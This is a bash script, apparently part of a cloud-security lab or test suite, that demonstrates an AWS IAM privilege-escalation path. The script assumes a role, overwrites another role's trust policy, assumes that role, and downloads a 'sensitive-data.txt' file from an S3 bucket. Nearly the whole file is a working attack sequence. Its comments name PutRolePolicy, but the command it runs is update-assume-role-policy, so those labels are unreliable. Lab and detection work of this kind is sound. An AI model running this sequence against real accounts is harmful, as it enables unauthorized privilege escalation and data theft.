#!/bin/bash

# Demo script for iam:PutRolePolicy to S3 bucket access
# This script demonstrates how a role with PutRolePolicy permission can modify another role to gain S3 access

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
PROFILE="pl-pathfinder-starting-user-prod"
STARTING_USER="pl-pathfinder-starting-user-prod"
PRIVESC_ROLE="pl-prod-one-hop-putrolepolicy-bucket-privesc-role"
BUCKET_ACCESS_ROLE="pl-prod-one-hop-putrolepolicy-bucket-access-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PutRolePolicy to S3 Bucket Access Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Verify starting user identity
echo -e "${YELLOW}Step 1: Verifying identity as starting user${NC}"
CURRENT_USER=$(aws sts get-caller-identity --profile $PROFILE --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    echo "Please configure your AWS CLI profile '$PROFILE' to use the starting user credentials"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 2: Get account ID
echo -e "${YELLOW}Step 2: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --profile $PROFILE --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 3: Assume the privilege escalation role
echo -e "${YELLOW}Step 3: Assuming role $PRIVESC_ROLE${NC}"
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${PRIVESC_ROLE}"
echo "Role ARN: $ROLE_ARN"

CREDENTIALS=$(aws sts assume-role \
    --role-arn $ROLE_ARN \
    --role-session-name demo-privesc-session \
    --profile $PROFILE \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')

# Verify we're now the role
ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $ROLE_IDENTITY"
echo -e "${GREEN}✓ Successfully assumed role${NC}\n"

# Step 4: Check current permissions (should not have S3 access yet)
echo -e "${YELLOW}Step 4: Testing current permissions${NC}"
BUCKET_NAME=$(aws s3api list-buckets --query "Buckets[?starts_with(Name, 'pl-prod-one-hop-putrolepolicy-bucket-')].Name" --output text 2>/dev/null || echo "")

if [ -z "$BUCKET_NAME" ]; then
    echo -e "${GREEN}✓ Confirmed: Cannot list S3 buckets yet${NC}"
else
    echo "Found bucket: $BUCKET_NAME"
fi
echo ""

# Step 5: Modify the bucket access role to allow us to assume it
echo -e "${YELLOW}Step 5: Modifying $BUCKET_ACCESS_ROLE trust policy using PutRolePolicy${NC}"
echo "Adding inline policy to allow assumption by $PRIVESC_ROLE..."

BUCKET_ACCESS_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${BUCKET_ACCESS_ROLE}"

# Create an inline policy that allows the privesc role to assume the bucket access role
cat > /tmp/assume-role-policy.json << EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "${ROLE_ARN}"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
EOF

# Use PutRolePolicy to add trust (this is the privilege escalation)
# Note: This modifies the trust policy, not the permissions policy
aws iam update-assume-role-policy \
    --role-name $BUCKET_ACCESS_ROLE \
    --policy-document file:///tmp/assume-role-policy.json

echo -e "${GREEN}✓ Successfully modified role trust policy${NC}\n"

# Wait for IAM changes to propagate
echo -e "${YELLOW}Waiting 10 seconds for IAM changes to propagate...${NC}"
sleep 10
echo ""

# Step 6: Assume the bucket access role
echo -e "${YELLOW}Step 6: Assuming bucket access role $BUCKET_ACCESS_ROLE${NC}"
BUCKET_ROLE_CREDENTIALS=$(aws sts assume-role \
    --role-arn $BUCKET_ACCESS_ROLE_ARN \
    --role-session-name demo-bucket-access-session \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo $BUCKET_ROLE_CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $BUCKET_ROLE_CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $BUCKET_ROLE_CREDENTIALS | jq -r '.SessionToken')

BUCKET_ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $BUCKET_ROLE_IDENTITY"
echo -e "${GREEN}✓ Successfully assumed bucket access role${NC}\n"

# Step 7: Discover and access the bucket
echo -e "${YELLOW}Step 7: Discovering target bucket${NC}"
BUCKET_NAME=$(aws s3api list-buckets --query "Buckets[?starts_with(Name, 'pl-prod-one-hop-putrolepolicy-bucket-')].Name" --output text)
echo "Target bucket: $BUCKET_NAME"
echo -e "${GREEN}✓ Found target bucket${NC}\n"

# Step 8: List bucket contents
echo -e "${YELLOW}Step 8: Listing bucket contents${NC}"
echo "Contents of $BUCKET_NAME:"
aws s3 ls s3://$BUCKET_NAME/
echo -e "${GREEN}✓ Successfully listed bucket contents${NC}\n"

# Step 9: Download sensitive data
echo -e "${YELLOW}Step 9: Downloading sensitive data${NC}"
DOWNLOAD_FILE="/tmp/putrolepolicy-sensitive-data-${ACCOUNT_ID}.txt"
aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $DOWNLOAD_FILE

echo -e "\n${GREEN}✓ Successfully downloaded sensitive file${NC}"
echo -e "${YELLOW}Contents of sensitive file:${NC}"
cat $DOWNLOAD_FILE
echo ""

# Summary
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Attack Summary${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
echo -e "Step 1: Assumed role ${YELLOW}$PRIVESC_ROLE${NC}"
echo -e "Step 2: Modified ${YELLOW}$BUCKET_ACCESS_ROLE${NC} trust policy using PutRolePolicy"
echo -e "Step 3: Assumed ${YELLOW}$BUCKET_ACCESS_ROLE${NC}"
echo -e "Step 4: Gained access to ${YELLOW}$BUCKET_NAME${NC}"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → $PRIVESC_ROLE → (PutRolePolicy) → $BUCKET_ACCESS_ROLE → $BUCKET_NAME"
echo ""
echo -e "${GREEN}Downloaded file location: $DOWNLOAD_FILE${NC}"
echo ""

# Standardized test results output
echo "TEST_RESULT:prod_one_hop_to_bucket_iam_putrolepolicy:SUCCESS"
echo "TEST_DETAILS:prod_one_hop_to_bucket_iam_putrolepolicy:Successfully accessed S3 bucket via PutRolePolicy modification"
echo "TEST_METRICS:prod_one_hop_to_bucket_iam_putrolepolicy:role_modified=true,bucket_accessed=true,data_exfiltrated=true"
echo ""

# Cleanup instructions
echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to restore the original role trust policy${NC}"
echo ""
echo -e "${YELLOW}To clean up:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Clean up temp file
rm -f /tmp/assume-role-policy.json
